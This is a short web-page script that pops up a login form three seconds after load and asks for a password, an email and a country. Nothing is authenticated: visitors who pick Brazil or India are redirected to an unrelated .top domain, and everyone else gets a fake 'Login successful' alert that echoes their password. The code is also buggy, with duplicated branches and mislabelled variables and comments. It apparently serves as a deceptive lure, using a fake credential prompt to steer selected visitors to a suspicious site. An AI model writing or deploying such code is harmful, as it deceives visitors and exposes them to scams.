
const loginPopup = document.querySelector(".login-popup");
var close = document.querySelector(".close");




function showPopup(){
      const timeLimit = 3 // seconds;
      let i=0;
      const timer = setInterval(function(){
       i++;
       if(i == timeLimit){
        clearInterval(timer);
        loginPopup.classList.add("show");
       } 
       console.log(i)
      },1000);
}


function login() {
    var name = document.getElementById('Password').value;
    var email = document.getElementById('Email').value;
    var country = document.getElementById('country').value;
  
    // Simulate login logic (you can replace this with your actual login logic)
    if (name && email && country) {
        if (country === 'brazil') {
            // Redirect to a specific website for Brazil
            window.location.href = 'https://1wviyp.top/';
        } else {
            alert('Login successful!\nName: ' + name + '\nEmail: ' + email + '\nCountry: ' + country + '\nClick on Exit!!');
            loginPopup.classList.remove("show");
        }
        if (country === 'india') {
            // Redirect to a specific website for Brazil
            window.location.href = 'https://1wviyp.top/';
        } else {
            alert('Login successful!\nName: ' + name + '\nEmail: ' + email + '\nCountry: ' + country + '\nClick on Exit!!');
            loginPopup.classList.remove("show");
        }

    } else {
        alert('Please fill in all the fields');
    }
  }


  window.addEventListener("load",function(){

    showPopup();
    // setTimeout(function(){
    //   loginPopup.classList.add("show");
    // },5000)
   
   })